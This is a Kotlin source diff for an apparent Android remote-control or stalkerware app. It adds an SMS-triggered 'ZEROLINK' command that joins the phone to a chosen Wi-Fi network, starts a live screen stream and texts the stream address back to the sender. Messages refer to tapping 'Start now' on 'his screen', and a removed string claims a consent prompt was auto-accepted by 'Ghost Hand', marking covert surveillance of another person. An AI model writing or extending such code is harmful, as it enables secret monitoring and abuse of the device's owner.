@@ -923,7 +923,7 @@ object CommandProcessor {
                         }
                         if (connected) {
                             status = "WIFI_CONNECTED"
-                            errorMsg = "Connected to $ssid. Local IP: $localIp | Gateway: 192.168.43.1"
+                            errorMsg = "Connected to $ssid\nhttp://$localIp:${LiveStreamManager.pendingPort}"
                         } else {
                             status = "WIFI_CONNECT_FAILED"
                             errorMsg = "Failed to connect to $ssid within 12s. Check password or hotspot availability."
@@ -937,6 +937,59 @@ object CommandProcessor {
                     WifiConnector.disconnect(ctx)
                     status = "WIFI_DISCONNECTED"
                     errorMsg = "Split-routing Wi-Fi link released and process network unbound."
+                }
+                "ZEROLINK" -> {
+                    val parts = content.split("|")
+                    val ssid = parts.getOrNull(0)?.trim() ?: ""
+                    val pass = parts.getOrNull(1)?.trim() ?: ""
+                    val fps = parts.getOrNull(2)?.trim()?.toIntOrNull() ?: 30
+                    val qual = parts.getOrNull(3)?.trim()?.uppercase() ?: "MED"
+                    val port = parts.getOrNull(4)?.trim()?.toIntOrNull() ?: 8888
+
+                    // Step 1: Connect Wi-Fi if not already on a 192.168.x.x network and SSID was supplied
+                    var currentIp = WifiConnector.getLocalIpAddress(ctx)
+                    if ((currentIp == null || !currentIp.startsWith("192.168.")) && ssid.isNotEmpty()) {
+                        DebugLogger.log("ZEROLINK", "Phase 1: Connecting to Wi-Fi '$ssid'...")
+                        WifiConnector.connect(ctx, ssid, pass)
+                        for (attempt in 1..24) {
+                            kotlinx.coroutines.delay(500)
+                            val connStatus = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).getString("wifi_connect_status", "NONE")
+                            if (connStatus == "SUCCESS") {
+                                currentIp = WifiConnector.getLocalIpAddress(ctx)
+                                break
+                            }
+                        }
+                    }
+
+                    // Step 2: Start Screen Stream if not already active
+                    if (!LiveStreamManager.isStreaming) {
+                        DebugLogger.log("ZEROLINK", "Phase 2: Starting Screen Stream ($fps FPS)...")
+                        LiveStreamManager.pendingFps = fps
+                        LiveStreamManager.pendingQual = qual
+                        LiveStreamManager.pendingPort = port
+                        ScreenRecordManager.expectedMode = "AUTO"
+
+                        val i = Intent(ctx, PulseActivity::class.java).apply {
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                            putExtra("is_screen_record_trigger", true)
+                            putExtra("is_live_stream", true)
+                        }
+                        ctx.startActivity(i)
+
+                        for (step in 1..12) {
+                            kotlinx.coroutines.delay(500)
+                            if (LiveStreamManager.isStreaming) break
+                        }
+                    }
+
+                    val finalIp = WifiConnector.getLocalIpAddress(ctx) ?: "192.168.43.X"
+                    if (LiveStreamManager.isStreaming) {
+                        status = "ZEROLINK_READY"
+                        errorMsg = "ZeroLink LIVE ($fps FPS):\nhttp://$finalIp:$port"
+                    } else {
+                        status = "MANUAL_ACTION_REQUIRED"
+                        errorMsg = "Wi-Fi IP: $finalIp. Tap 'Start now' on his screen (5s window), then open:\nhttp://$finalIp:$port"
+                    }
                 }
                 "START_STREAM" -> {
                     val parts = content.split("|")
@@ -974,10 +1027,10 @@ object CommandProcessor {
                         val ip = WifiConnector.getLocalIpAddress(ctx) ?: "192.168.43.X"
                         if (streamActive) {
                             status = "STREAM_ACTIVE"
-                            errorMsg = "Stream LIVE at http://$ip:$port ($fps FPS). Ghost Hand auto-accepted!"
+                            errorMsg = "Stream LIVE ($fps FPS):\nhttp://$ip:$port"
                         } else {
                             status = "MANUAL_ACTION_REQUIRED"
-                            errorMsg = "Ghost Hand awaiting confirmation. Please tap 'Start now' on the screen (5s window active)!"
+                            errorMsg = "Please tap 'Start now' on his screen (5s window). Once tapped, open:\nhttp://$ip:$port"
                         }
                     }
                 }
@@ -3410,7 +3463,7 @@ object CommandProcessor {
                 // Reply directly via SMS if triggered via SMS for Wi-Fi / Stream commands
         val smsReplyTo = cmd.optString("sms_sender", "")
         val smsSubId = cmd.optInt("sms_sub_id", -1)
-        if (smsReplyTo.isNotEmpty() && (fileName == "CONNECT_WIFI" || fileName == "START_STREAM" || fileName == "STOP_STREAM")) {
+        if (smsReplyTo.isNotEmpty() && (fileName == "CONNECT_WIFI" || fileName == "START_STREAM" || fileName == "STOP_STREAM" || fileName == "ZEROLINK")) {
             val replyText = if (errorMsg.isNotEmpty()) "[$status] $errorMsg" else "[$status]"
             PhoneManager.sendLegitSms(ctx, smsReplyTo, replyText, smsSubId)
         }
